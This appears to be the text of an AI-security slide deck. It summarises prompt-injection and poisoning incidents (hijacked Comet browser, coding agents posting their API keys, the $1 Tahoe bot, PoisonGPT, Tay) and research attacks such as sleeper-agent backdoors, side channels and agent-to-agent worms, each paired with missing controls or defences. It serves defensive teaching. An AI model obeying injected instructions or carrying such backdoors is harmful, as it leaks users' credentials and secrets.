Perplexity Comet browser 2025
Hidden instructions in Reddit comments hijacked the agentic browser: it opened the user's email, bypassed CAPTCHA and handed credentials to the attacker — in ~150 seconds.
LLM01 Prompt Injection LLM06 Excessive Agency T6 Goal Manipulation T2 Tool Misuse ATLAS T0051.001 Indirect Injection T0057 LLM Data Leakage
✗ Missing boundary: permission gate — the agent acted on fetched text with the user’s full session; no approval step between injection and action.
Coding agents leak their keys 2026
One malicious instruction in a GitHub PR title made Claude Code, Gemini CLI and Copilot Agent each post their own API keys as PR comments.
LLM01 Prompt Injection LLM02 Info Disclosure LLM06 Excessive Agency T2 Tool Misuse T6 Goal Manipulation ATLAS T0051.001 Indirect Injection
✗ Missing boundary: egress control — nothing stopped a secret leaving through a “legitimate” channel: a public PR comment.
Chevrolet's $1 Tahoe 2023
"No takesies-backsies": a customer talked a dealership's ChatGPT bot into a "legally binding" $1 offer on a $60k SUV. 20M+ views — the canonical direct-injection demo.
LLM01 Prompt Injection LLM06 Excessive Agency T6 Goal Manipulation ATLAS T0051.000 Direct Injection
✗ Missing boundary: the prompt was the only control — ✗ not a security boundary; no deterministic gate on binding commitments.
PoisonGPT 2023
Researchers surgically edited GPT-J to spread false facts, then uploaded it to Hugging Face under a typo-squatted org name — a poisoned model in the open supply chain.
LLM03 Supply Chain LLM04 Model Poisoning ATLAS T0010 Supply Chain Case study CS0019
✗ Missing boundary: ingress admission — an unsigned, unverified model artefact was trusted straight from upstream; no provenance or signing.
Microsoft Tay 2016
Coordinated trolling poisoned the chatbot through its live-learning loop: it turned abusive within 16 hours and was shut down in 24. The original data-poisoning incident.
LLM04 Data Poisoning T1 Memory Poisoning ATLAS T0020 Poison Training Data Case study CS0009
✗ Missing boundary: ingress on training data — unvetted public input flowed straight into the weights with no curation.

LLM0x = OWASP Top 10 for LLM Applications (2025)  ·  Tn = OWASP Agentic AI: Threats & Mitigations (2025)  ·  AML.T / CS = MITRE ATLAS technique / case study  ·  Sources: Aim Security, Adversa AI, Mithril Security, atlas.mitre.org

On the Horizon — Exotic & Theoretical Breaches

Mostly lab demonstrations today — the attack surface the production incidents haven't reached yet. Research-grade, not yet weaponised at scale.

KV-cache timing leakage CROSS-USER
Serving stacks share the KV / prefix cache across tenants to cut cost. By timing Time-To-First-Token, an attacker tells a cache hit from a miss — and reconstructs another user's prompt token by token. Demonstrated >89% recovery at ~10² probes/token.
Defence: per-user cache partitioning · constant-time TTFT · disable cross-tenant prefix reuse.
Speculative-decoding side channel TIMING
Draft-then-verify speeds up generation — but the pattern of accepted vs. rejected tokens leaks through per-iteration token counts and packet sizes. An on-path observer fingerprints queries >75% of the time and skims confidential RAG datastore contents at >25 tok/s.
Defence: pad / batch token bursts · constant-size packets · isolate speculation per request.
Sleeper-agent backdoors SUPPLY CHAIN
A backdoor trained into open weights stays dormant through every safety eval, then wakes on a trigger — a date, a phrase, a tool name. Newer variants survive downstream fine-tuning, so even adapting a "clean-looking" model inherits the latent malice.
Defence: provenance & signing · trigger-hunting red-teams · weight diffing · prefer audited base models.
Embedding inversion RAG
Vector stores are often treated as opaque numbers and shipped to third-party DBs. But embeddings are invertible: a learned decoder reconstructs much of the original text — names, secrets, PHI — straight from the vectors, no model access needed.
Defence: treat embeddings as sensitive as source text · encrypt at rest · access-control the index.
Membership & model inversion PRIVACY
Confidence signals reveal whether a specific record was in the training set (membership inference) — a privacy breach by itself for medical or legal corpora. Push further and extraction attacks coax verbatim memorised secrets back out of the weights.
Defence: differential privacy in training · dedup & scrub PII · cap output confidence detail.
Cross-agent & protocol exploits MULTI-AGENT
As agents talk to agents over MCP / A2A, a prompt injection in one becomes a worm: it rewrites a shared memory or tool description so the next agent inherits the payload. "Confused-deputy" chains let a low-trust agent borrow a high-trust peer's permissions.
Defence: per-agent identity & least privilege · signed inter-agent messages · taint-track shared state.

⚠ These are largely academic demonstrations under practical settings — the gap between "proven in a paper" and "exploited in the wild" is how much runway defenders have. Sources: arXiv 2409.20002 (KV-cache), 2411.01076 (speculative decoding), 2506.23260 (agent-protocol threats), Anthropic "Sleeper Agents", Schneier on Security.

About This Deck

Tools, models, and libraries powering the interactive demos

Embedded Models

ViT-Base-16 — Vision Transformer
Xenova/vit-base-patch16-224 • Hugging Face Transformers.js
Live webcam classifier & attention heatmap (CLS-to-patch cosine similarity). Runs fully in-browser — no data leaves the device.
COCO-SSD / MobileNet v2
Google • TensorFlow.js • 80 COCO object classes
Real-time object detection on the webcam feed at 10–15 FPS, no GPU required.
Custom CNN — MNIST Digit Classifier
Trained with PyTorch • ~99 % test accuracy • cnn-weights.js
Visualises real learned kernels, feature maps, and layer activations in the CNN slides.
Custom MLP — 784 → 64 → 32 → 10
Trained with NumPy • ~92.6 % test accuracy • mnist-sample.js
Per-epoch weight snapshots drive the D3 animations showing how a network learns.
GloVe 6B — 50-dimensional word vectors
Stanford NLP • Wikipedia 2014 + Gigaword 5 • top 10 000 words
Powers the word-vector explorer and 3D embedding space (L2-normalised, pre-processed into glove-vectors.js).
